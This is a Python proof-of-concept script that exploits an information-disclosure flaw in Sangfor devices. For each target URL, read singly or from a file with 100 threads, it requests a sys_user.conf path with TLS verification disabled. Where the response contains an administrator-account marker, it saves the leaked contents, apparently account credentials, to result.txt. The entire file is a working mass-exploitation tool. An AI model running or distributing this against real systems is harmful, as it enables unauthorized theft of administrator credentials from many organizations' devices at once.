import sys,argparse,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """深信服信息泄露"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="深信服信息泄露")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(targer):
    payload = "/tmp/updateme/sinfor/ad/sys/sys_user.conf"
    res = requests.get(targer)
    try:
        if res.status_code == 200:
            res1 = requests.get(url=targer+payload,verify=False)
            if res1.status_code == 200 and "管理员账户" in res1.text:
                print(f"[+]{targer} 存在漏洞")
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(f"[+]{targer} 存在漏洞，其内容为:{res1.text}")
            else:
                print(f"[-] {targer} 不存在漏洞")
        else:
            print(f"{targer}可能有问题，请手工查看")

    except Exception as e:
        print(e)



if __name__ == '__main__':
    main()